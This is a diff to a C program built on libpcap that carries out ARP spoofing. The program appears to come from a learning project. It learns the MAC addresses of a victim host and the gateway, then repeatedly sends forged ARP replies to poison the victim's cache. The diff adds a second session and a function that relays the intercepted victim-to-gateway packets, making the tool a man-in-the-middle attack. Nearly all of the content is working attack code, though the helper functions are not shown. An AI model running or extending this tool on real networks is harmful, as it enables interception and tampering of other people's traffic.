@@ -29,17 +29,12 @@ int main(int argc, char* argv[]){
     }
 
     /* FIRST SESSION for [victim(sender) > gateway(target)] */
-    // initialize the pcd
-    pcd_init(&pcd, &device);
-	// get my ip, mac_address from ifconfig result
-	getMyIpMac(&myMac, &myIp);
-	// get Gateway IP
-	getGWIp(&GWIp);
-	// send ARP request to get victim MAC
-	ARPrequest(victimIp, myMac, myIp, pcd);	
-	// get ARP reply, filtering it to get correct reply
-	//pcapCapture(&victimIp);
-	pcapCapture(&victimIp,  device, pcd, packet);
+    pcd_init(&pcd, &device);			// initialize the pcd
+	getMyIpMac(&myMac, &myIp);			// get my ip, mac_address from ifconfig result
+	getGWIp(&GWIp);						// get Gateway IP
+	ARPrequest(victimIp, myMac, myIp, pcd);			// send ARP request to get victim MAC
+	pcapCapture(&victimIp,  device, pcd, packet);	// get ARP reply, filtering it to get correct reply
+
 	// read mac from the file to send ARP which will infect the victim
 	fp = fopen("targetmac.txt", "r"); 
 	if(fp == NULL){
@@ -47,6 +42,20 @@ int main(int argc, char* argv[]){
 	}
 	fgets(buf, sizeof(buf), fp);
 	ether_aton_r(buf, &victimMac);
+	fclose(fp);
+
+
+	/* SECOND SESSION for [victim(gateway) > user(target)] */
+	ARPrequest(GWIp, myMac, myIp, pcd);			// send ARP request to get victim MAC
+	pcapCapture(&GWIp,  device, pcd, packet);	// get ARP reply, filtering it to get correct reply
+	
+	// read mac from the file to send ARP which will infect the victim
+	fp = fopen("targetmac.txt", "r"); 
+	if(fp == NULL){
+		printf("file open error");
+	}
+	fgets(buf, sizeof(buf), fp);
+	ether_aton_r(buf, &GWMac);
 	fclose(fp);
 
 	struct pcap_pkthdr *pkthdr;
@@ -66,6 +75,7 @@ int main(int argc, char* argv[]){
 		time(&end);
 		if(difftime(end, start) >= 10){
 			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
+			//ARPreply(GWMac, GWIp, myMac, victimIp, pcd);
 			time(&start);
 			printf("time expired\n");
 		}
@@ -73,13 +83,13 @@ int main(int argc, char* argv[]){
 		if( ( isbroadcast(packet, GWIp) ) || ( isbroadcast(packet, victimIp) ) ) {
 			//sleep(1);	// after sender get the reply from the GW
 			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
+			//ARPreply(GWMac, GWIp, myMac, victimIp, pcd);
 		}
 
 		//victim->GW가 있으면 잡기. 만약 잡히면 수정해서(source mac) relay
-		pcap_victiom_to_GW(victimIp, GWIp, myMac, myIp, device, pcd, packet);
+		pcap_from_victiom(victimIp, GWIp, GWMac, myMac, device, pcd, pkthdr, packet);
+		//pcap_from_victiom(GWIp, victimIp, victimMac, device, pcd, packet);
 	}
-	// get the packet [victim(sender) > Gateway(target)]
-
 	pcap_close(pcd);
 
 	return 1;
